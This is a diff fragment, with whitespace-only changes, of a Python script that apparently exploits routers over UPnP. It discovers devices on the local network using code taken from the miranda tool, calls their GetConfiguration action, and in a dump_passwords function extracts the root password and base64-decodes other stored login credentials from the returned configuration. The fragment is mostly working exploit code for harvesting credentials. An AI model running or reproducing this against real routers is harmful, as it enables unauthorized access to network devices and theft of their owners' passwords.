@@ -29,7 +29,7 @@ def dump_passwords(cfg):
     o.append({'username':'root', 'password':root_pass})
 
     #get the other configured passwords.
-    #we only want elements with the instance attribute. 
+    #we only want elements with the instance attribute.
     for i in r.findall('./InternetGatewayDevice/X_5067F0_LoginCfg/X_5067F0_Login_Group/Use_Login_Info[@instance]'):
         u = i.find('UserName').text
         p = b64decode(i.find('Password').text)
@@ -44,14 +44,14 @@ def dump_passwords(cfg):
 #local UPnP class to shut up some error messages
 class localUPnP(upnp):
 	def updateCmdCompleter(self,struct):
-		pass 
+		pass
 
 def get_router_config():
     hp = localUPnP(False, False, None, {})
     hp.UNIQ = True
     hp.VERBOSE = False
     hp.TIMEOUT = 1
-    
+
     #find all devices on the network
     msearch(0, None, hp)
 
@@ -59,7 +59,7 @@ def get_router_config():
     #most of this section ripped from the host get command in miranda
     for k,h in hp.ENUM_HOSTS.items():
         print("Requesting device and service info for %s (this could take a few seconds)..." % (h['name']))
- 
+
         (xmlHeaders,xmlData) = hp.getXML(h['xmlFile'])
         if xmlData == False:
             print('Failed to request host XML file:',h['xmlFile'])
@@ -68,7 +68,7 @@ def get_router_config():
             print("Failed to get device/service info for %s..." % h['name'])
             return
         print('Host data enumeration complete! Checking for GetConfiguration action...')
-        
+
         #check for the GetConfiguration method
         try:
             if 'GetConfiguration' in h['deviceList']['InternetGatewayDevice']['services']['DeviceConfig']['actions'].keys():
